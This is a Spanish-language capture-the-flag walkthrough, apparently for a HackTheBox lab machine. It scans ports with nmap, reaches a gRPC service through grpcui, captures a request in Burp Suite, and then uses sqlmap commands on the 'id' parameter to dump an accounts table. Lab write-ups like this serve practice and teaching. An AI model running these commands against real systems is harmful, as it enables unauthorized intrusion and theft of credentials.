-p- --
NOTA:
-p- : -> se utiliza para escanear todos los puertos TCP de un objetivo
-- open: -> se utiliza para mostrar solo los puertos abiertos
-sS: -> escaneo tipico TCP SYN
-sC:  -> se utiliza para activar los scripts de NSE (Nmap Scripting Engine).
-sV: -> se utiliza para realizar un escaneo de versión de servicios.
-min-rate: -> se utiliza para especificar la velocidad mínima de envío de paquetes durante un escaneo.
-Pn: -> se utiliza para indicar a Nmap que realice un escaneo sin enviar sondas de descubrimiento de host (ping)
-oN: -> se utiliza para guardar todo en un archivo


Ahora si procedamos 
primero se realiza un escaneo con nmap con la secuencia de comandos
nmap -p- --open -sS -sC -sV --min-rate 222 -Pn 10.10.11.214 -oN Escaneo
para que encuentre todos los puertos abiertos, esto nos arroja 2 puertos 
![[Pasted image 20230530171050.png]]
puerto 22 y puerto 50051
el en puerto 22 esta el servicio ssh y en el puerto 50051 gRPC (Google Remote Procedure Call)
una vez identificado vamos a este repo https://github.com/fullstorydev/grpcui/releases/tag/v1.3.1 y descargamos 
![[Pasted image 20230530184706.png]]

creamos una carpeta en descargas como grpcui y metemos el archivo allí, ejecutamos 
![[Pasted image 20230530190742.png]]
con lo que nos mandara  una url 
en donde pondremos los siguientes valores 
![[Pasted image 20230530192417.png]]

luego deberia salirnos un response como este y un token entre comillas simples
![[Pasted image 20230530192600.png]]

![[Pasted image 20230601181220.png]]
ahora vamos a  Getinfo en el method name.
donde dice name escribimos token
donde dice value escribimos el token que generamos anteriormente y en id ponemos 1.
antes de dar click en invoke usamos foxyproxy y burpsuite
ponemos el target
![[Pasted image 20230530192959.png]]
![[Pasted image 20230530193042.png]]
encendemos el proxy y el foxi proxy 
una vez hecho todo lo anterior en el burpsuite deberia aparecer lo siguiente 
![[Pasted image 20230530193633.png]]
hacemos clic derecho enviar a repeater, ahora lo guardamos como un archivo de texto plano. y vamos a usar sqlmap por lo que guardamos el archivo como pc
ahora ejecutamos
- sqlmap -r pc -p id --dbs
- sqlmap -r pc -p id --tables
- sqlmap -r pc -p id -D sqlite_masterdb -T accounts -- columns
- sqlmap -r pc -p id -D sqlite_masterdb -T accounts --batch --threads 5 --dump